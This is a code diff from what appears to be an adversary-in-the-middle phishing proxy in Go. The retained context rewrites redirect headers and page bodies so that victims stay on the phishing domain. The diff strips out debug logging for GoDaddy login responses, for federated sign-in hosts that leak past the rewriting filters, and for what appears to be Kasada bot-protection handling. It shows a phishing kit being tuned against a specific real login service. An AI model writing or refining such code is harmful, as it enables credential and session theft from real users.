@@ -1342,30 +1342,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			req_hostname := strings.ToLower(resp.Request.Host)
 
-			// log GoDaddy login API responses for debugging
-			if strings.Contains(resp.Request.URL.Path, "idp/login") || strings.Contains(resp.Request.URL.Path, "api/login") {
-				log.Debug("[gdlogin-resp] path=%s status=%d ct=%s", resp.Request.URL.Path, resp.StatusCode, resp.Header.Get("Content-Type"))
-				if resp.Body != nil {
-					respBody, rerr := ioutil.ReadAll(resp.Body)
-					if rerr == nil {
-						resp.Body = ioutil.NopCloser(bytes.NewBuffer(respBody))
-						log.Debug("[gdlogin-resp] body=%s", string(respBody))
-					}
-				}
-			}
-
 			// if "Location" header is present, make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
 			if err == nil {
-				origHost := r_url.Host
 				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
 					r_url.Host = r_host
 					resp.Header.Set("Location", r_url.String())
-					if strings.Contains(origHost, "godaddy") || strings.Contains(origHost, "secureserver") {
-						log.Debug("[fedleak] Location rewritten: %s -> %s (from host=%s status=%d)", origHost, r_host, req_hostname, resp.StatusCode)
-					}
-				} else if strings.Contains(origHost, "godaddy") || strings.Contains(origHost, "secureserver") {
-					log.Warning("[fedleak] Location UNHANDLED: %s (from host=%s status=%d) — no proxy_host entry matches this IdP", origHost, req_hostname, resp.StatusCode)
 				}
 			}
 
@@ -1596,20 +1578,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			if err == nil {
-				// [DEBUG] Federation-leak diagnostic: log when a response body mentions
-				// known federated-IdP hostnames so we can see which origin delivered
-				// them and whether they survive sub_filter rewriting.
-				leakProbes := []string{"sso.godaddy.com", "sso.secureserver.net", "login.godaddy.com"}
-				var leaksBefore []string
-				for _, probe := range leakProbes {
-					if bytes.Contains(body, []byte(probe)) {
-						leaksBefore = append(leaksBefore, probe)
-					}
-				}
-				if len(leaksBefore) > 0 {
-					log.Debug("[fedleak] pre-rewrite host=%s ct=%s status=%d probes_hit=%v url=%s", req_hostname, mime, resp.StatusCode, leaksBefore, resp.Request.URL.Path)
-				}
-
 				for site, pl := range p.cfg.phishlets {
 					if p.cfg.IsSiteEnabled(site) {
 						// handle sub_filters — collect matching filter sets, supporting
@@ -1625,9 +1593,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if subfilterKeyMatches(key, req_hostname) {
 								matchedSfs = append(matchedSfs, sfs...)
 							}
-						}
-						if len(leaksBefore) > 0 {
-							log.Debug("[fedleak] phishlet=%s req_hostname=%s matched_sub_filters=%d", pl.Name, req_hostname, len(matchedSfs))
 						}
 						if len(matchedSfs) > 0 {
 							for _, sf := range matchedSfs {
@@ -1720,15 +1685,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									// produce misleading hints (e.g. "hostname") that don't appear in the body.
 									hint := extractLiteralHint(re_s)
 									hintHit := hint == "" || bytes.Contains(body, []byte(hint))
-									if strings.Contains(sf.regexp, `"domain"`) || strings.Contains(sf.regexp, "{hostname}") {
-										log.Debug("[kasada-dbg] req=%s sf.regexp=%q hint=%q hintHit=%v bodyLen=%d re_s=%q replace_s=%q", req_hostname, sf.regexp, hint, hintHit, len(body), re_s, replace_s)
-									}
 									if hintHit {
 										if re, err := regexp.Compile(re_s); err == nil {
-											matchCount := len(re.FindAllString(string(body), -1))
-											if matchCount > 0 || strings.Contains(sf.regexp, `"domain"`) {
-												log.Debug("[kasada-dbg] regex matches=%d for re_s=%q on req=%s", matchCount, re_s, req_hostname)
-											}
 											if sf.domain == "*" {
 												plName := pl.Name
 												body = []byte(re.ReplaceAllStringFunc(string(body), func(m string) string {
@@ -1749,21 +1707,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 								}
-							}
-						}
-
-						// [DEBUG] Federation-leak diagnostic: post-rewrite check
-						if len(leaksBefore) > 0 {
-							var leaksAfter []string
-							for _, probe := range leaksBefore {
-								if bytes.Contains(body, []byte(probe)) {
-									leaksAfter = append(leaksAfter, probe)
-								}
-							}
-							if len(leaksAfter) > 0 {
-								log.Warning("[fedleak] phishlet=%s req_hostname=%s LEAKED after sub_filter: %v (%d matched filters did not rewrite)", pl.Name, req_hostname, leaksAfter, len(matchedSfs))
-							} else {
-								log.Debug("[fedleak] phishlet=%s req_hostname=%s all probes rewritten", pl.Name, req_hostname)
 							}
 						}
 
